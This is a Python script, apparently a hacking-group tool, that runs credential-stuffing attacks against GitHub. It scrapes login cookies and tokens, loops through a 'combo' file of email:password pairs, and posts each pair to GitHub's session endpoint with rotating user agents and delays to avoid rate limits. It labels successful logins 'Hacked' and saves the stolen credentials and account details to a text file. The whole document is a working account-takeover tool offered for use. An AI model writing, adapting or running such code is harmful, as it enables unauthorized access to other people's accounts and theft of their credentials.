from os import system as alEx

class GitHub:
	def Get_Cookies(self):
		from os import remove as ExEc
		ExEc('Cookies.json')
		Cookies = self.lib()['get']('https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Fsignup%3Fuser_email%3D%26source%3Dform-home-signup',headers={'user-agent':str(self.Generate_User_Agent())})
		Otco = Cookies.cookies.get_dict()['_octo'];d_id = Cookies.cookies.get_dict()['_device_id']
		g_ss = Cookies.cookies.get_dict()['_gh_sess']
		a_t = Cookies.text.split('authenticity_token" value="')[1].split('"')[0]
		cookies='cookies'
		Cooki={}
		Cooki[cookies]= {'otco':str(Otco),'device_id':str(d_id),'g_ss':str(g_ss),'a_t':str(a_t)}
		with open('Cookies.json','w') as alx:
			alx.write(self.lib()['Dumps'](Cooki))
		
		 
	def Generate_User_Agent(self):
		User_Agent=str(self.lib()['choice'](['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2667.96 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2954.87 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)','Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2645.88 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2823.75 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0','Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2884.13 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2644.90 Safari/537.36']));return User_Agent
	
	def lib(self):
		from random import choice,randint as rnd;from sys import stdout;from time import sleep
		try:from requests import (post,get)
		except ModuleNotFoundError:alEx('pip install requests');alEx('clear')
		try:from json import dumps,loads
		except ModuleNotFoundError: alEx('pip install json');alEx('clear')
		try: from cfonts import render as ren
		except ModuleNotFoundError: alEx('pip install python-cfonts');alEx('clear')
		try: from names import (get_full_name,get_first_name,get_last_name)
		except ModuleNotFoundError: alEx('pip install names');alEx('clear')
		try: from datetime import datetime
		except ModuleNotFoundError:alEx('pip install datetime');alEx('clear')
		return {'get':get,
		'post':post,'choice':choice,
		'randint':rnd,
		'ren':ren,
		'Dumps':dumps,'Loads':loads,
		'full':get_full_name,'last':get_last_name,
		'first':get_first_name,'time':datetime.now().timestamp(),
'sys':stdout, 
'sleep':sleep
		
		}
		
	def Get_SomInfo(self,User,Email,Password):
		Url = self.lib()['get'](f'https://github.com/{User}').text
		Name = Url.split('title')[1].split('(')[1].split(')')[0];Id=Url.split('<meta name="octolytics-dimension-user_id" content="')[1].split('"')[0];Name = Url.split('title')[1].split('(')[1].split(')')[0]
		photo = self.lib()['get'](f"https://avatars.githubusercontent.com/u/{Id}?s=40&v=40")
		#with open('q.jpg','wb') as s:
#			s.write(photo.content)
		ass = f'''
* New Account GitHub :
	
- Email ~> {Email} •
- PassWord ~> {Password} •
- UsEr ~> {User} •
- Name ~> {Name} •
- Id-Acc ~> {Id} •
- Link Acc ~> https://github.com/{User} •

- DeV :- @M_L_F ~> T-ExEc •
		'''
		with open('ExEc-GitHub.txt','a') as ex:
			ex.write(ass+'\n')
	def Request_Login(self,d_id,otco,g_ss,a_t,email,password):
		Email = str(email.split('@')[0]);Domain = str(email.split('@')[1])
		_Login = self.lib()['post']("https://github.com/session",headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding':'gzip, deflate, br','accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','content-length':'503','content-type':'application/x-www-form-urlencoded','cookie':'_device_id='+str(d_id)+'; _octo='+str(otco)+'; logged_in=no; _gh_sess='+str(g_ss)+'; preferred_color_mode=light; tz=Asia%2FBaghdad','origin':'https://github.com','referer':'https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Fsignup%3Fuser_email%3D'+str(Email)+'%2540'+str(Domain)+'%26source%3Dform-home-signup','sec-ch-ua':'"Chromium";v="111","Not(A:Brand";v="8"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':str(self.Generate_User_Agent())},data={'commit': 'Sign in','authenticity_token':str(a_t),'login': str(email),'password': str(password),'webauthn-support': 'supported','webauthn-iuvpaa-support': 'unknown','return_to': f'https://github.com/signup?user_email={email}&source=form-home-signup','allow_signup': '','client_id': '','integration': '','required_field_31be': '',
'timestamp': str(self.lib()['time']),'timestamp_secret': 'c98108d5656d8c535d436248b7205151df5fbec17ec11640f1a40f07602ead47'}).text
		if "octolytics-actor-login" in _Login:
			User = _Login.split('name="octolytics-actor-login" content="')[1].split('"')[0]
			
			print('\033[2;36m'+"["+'\033[2;32m'+'√'+'\033[2;36m'+']''\033[2;32m'+' Hacked ~> '.upper()+'Email : '+email+' | Password : '+password);self.Get_SomInfo(User,email,password)
		elif "Incorrect username or password." in _Login:
			print('\033[1;31m'+"["+'\033[2;35m'+"×"+'\033[1;31m'+"]"+" Incorrect ~> ".upper()+'Email : '+email+' | Password : '+password)
		else:
			self.Get_Cookies()
			self.lib()['sleep'](self.lib()['randint'](15,20))
			
# alEx Was Here •

	def Control_Tool(self):
		print(self.lib()['ren']('ExEc',colors=[str(self.lib()['choice'](['red','green','white','black','blue'])), str(self.lib()['choice'](['red','green','white'])), str(self.lib()['choice'](['red','green','white']))],align='left'));print("\033[1;97m"+'-'*35)
		self.ExEc("\033[1;97m"+'<   '+"\033[1;93m"+'TeaM ~ ExEc ~ TheBesT   '+"\033[1;97m"+'>'+'\n'+"\033[1;97m"+'  <  '+"\033[1;93m"+'Check ~ TiktoK ~ Av  '+"\033[1;97m"+'>'+'\n'+"\033[1;97m"+'-'*35+'\n'+'\033[31;1m'+'['+"\033[1;97m"+"+"+'\033[31;1m'+']'+ "\033[1;93m"+' NAME       '+"\033[1;97m"+'~>'+"\033[1;93m"+' EXEC '+'\n'+'\033[31;1m'+'['+"\033[1;97m"+'+'+'\033[31;1m'+']'+"\033[1;93m"+' GITHUB     '+"\033[1;97m"+'~>'+"\033[1;93m"+' 6F8'+'\n'+'\033[31;1m'+'['+"\033[1;97m"+"+"+'\033[31;1m'+']'+ "\033[1;93m"+' INSTAGRAM  '+"\033[1;97m"+'~>'+"\033[1;93m"+' GXP6 '+'\n'+'\033[31;1m'+'['+"\033[1;97m"+'+'+'\033[31;1m'+']'+"\033[1;93m"+' TELEGRAM   '+"\033[1;97m"+'~>'+"\033[1;93m"+' VNVN6'+'\n'+'\033[31;1m'+'['+"\033[1;97m"+'+'+'\033[31;1m'+']'+"\033[1;93m"+' YOUTUBE    '+"\033[1;97m"+'~>'+"\033[1;93m"+' WARRIOR')
		exec = input("\033[1;97m"+'-'*35+'\n'+'\033[2;35m'+"("+"\033[1;97m"+"1"+'\033[2;35m'+")"+"\033[1;97m"+" Open Tool Options ".upper()+'\033[2;36m'+'•'+'\n'+ '\033[2;35m'+"("+"\033[1;97m"+"2"+'\033[2;35m'+")"+"\033[1;97m"+" Exit FroM The Tool ".upper()+'\033[2;36m'+'•'+'\n'+'\033[2;35m'+"["+"\033[1;97m"+"~"+'\033[2;35m'+"]"+"\033[1;97m"+" Choose Bro ".upper()+'\033[2;36m'+':'.upper())
		if exec == '1':
			alEx('clear')
			pass
		elif exec == '2':
			exit("\033[1;97m"+'[×] The tool has been exited •'.upper())
		else:
			print("\033[1;97m"+"[~] Plz Choose AnyThing •");self.lib()['sleep'](2);alEx('clear');self.Control_Tool()
			
		print(self.lib()['ren']('Git-Hub',colors=[str(self.lib()['choice'](['red','green','white','black','blue'])), str(self.lib()['choice'](['red','green','white'])), str(self.lib()['choice'](['red','green','white']))],align='left'));Choose = input("\033[1;97m"+'-'*35+'\n'+'\033[2;35m'+"("+"\033[1;97m"+"1"+'\033[2;35m'+")"+"\033[1;97m"+" Checker Email and Password From Combo ".upper()+'\033[2;36m'+'•'+'\n'+ '\033[2;35m'+"("+"\033[1;97m"+"2"+'\033[2;35m'+")"+"\033[1;97m"+" Checker Email and Password .... Coming Soon ".upper()+'\033[2;36m'+'•'+'\n'+'\033[2;35m'+"("+"\033[1;97m"+"3"+'\033[2;35m'+")"+"\033[1;97m"+" Checking The library ".upper()+'\033[2;36m'+'•'+'\n'+'\033[2;35m'+"("+"\033[1;97m"+"4"+'\033[2;35m'+")"+"\033[1;97m"+" Contant with The Programmer ".upper()+'\033[2;36m'+'•'+'\n'+'\033[2;35m'+"["+"\033[1;97m"+"~"+'\033[2;35m'+"]"+"\033[1;97m"+" Choose Bro ".upper()+'\033[2;36m'+':'.upper())
		
		if Choose == '1':
			try:
				alEx("clear")
				print("\033[1;97m"+"[<>] Plz wait , Getting Cookies ...".upper());self.lib()['sleep'](2);alEx('clear')
				self.Get_Cookies()
				print('\033[2;32m'+"[√] Done Get Cookies •".upper());self.lib()['sleep'](2);alEx('clear')
			except:
				pass
			
			with open('Cookies.json','r') as c:
				Cooki=self.lib()['Loads'](c.read())
				
			alEx('clear')
			
			File = input('\033[2;36m'+"["+"\033[1;97m"+"•"+'\033[2;36m'+"]"+"\033[1;97m"+"Enter Name Combo :- ".upper())
			try:
				for i in open(File,'r').read().splitlines():
					try:
						self.Request_Login(Cooki['cookies']['device_id'],Cooki['cookies']['otco'],Cooki['cookies']['g_ss'],Cooki['cookies']['a_t'],i.split(':')[0],i.split(':')[1])
					except:
						pass
			except FileNotFoundError:
					print("-"*20+'\n'+"[×] Combo is Not Found !".upper());self.lib()['sleep'](2);alEx('clear');self.Control_Tool()
			else:
					print("[•] Something wrong !".upper())
		elif Choose == '2':
			print("Coming soon bro , Plz Choose 1 ...");self.lib()['sleep'](3);alEx('clear');self.Control_Tool()
			
		elif Choose == '3':
			alEx('clear');print("\033[1;97m"+"[~] PLZ Wait , Downloading library ...".upper());self.lib()['sleep'](2)
			self.lib();alEx('clear');print('\033[2;32m'+"[√] library Was Downloaded •".upper());self.lib()['sleep'](2);alEx('clear');self.Control_Tool()
			
		elif Choose == '4':
				from webbrowser import open as a
				a('https://t.me/M_L_F');self.lib()['sleep'](3);alEx('clear');self.Control_Tool()
			
					
			
	def ExEc(self,alex):
	    	for exec in alex + '\n':
	    		self.lib()['sys'].write(exec)
	    		self.lib()['sys'].flush();self.lib()['sleep'](0.003)
	    		
GitHub().Control_Tool()
		